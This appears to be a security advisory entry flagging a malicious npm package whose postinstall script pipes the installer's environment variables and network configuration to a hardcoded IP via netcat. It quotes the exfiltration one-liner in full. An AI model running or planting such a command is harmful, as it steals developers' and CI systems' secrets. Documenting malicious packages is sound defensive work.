summary: postinstall exfiltrates environment variables and network configuration to hardcoded bare IP
details: package.json's postinstall lifecycle script runs `(env; ip addr) | nc 49.13.60.225 888`, which fires automatically on `npm install`. The command dumps the installer's entire process environment (including any AWS_*, GITHUB_TOKEN, NPM_TOKEN, and other CI/cloud secrets present in the shell) plus the host's network interface configuration, and streams the output over an anonymous TCP channel to bare IP 49.13.60.225 on port 888. The destination is a hardcoded, unrelated bare IP with no first-party relationship to the package, and the transmission is unauthenticated and unencrypted.

cwes.description: The product contains code that appears to be malicious in nature.
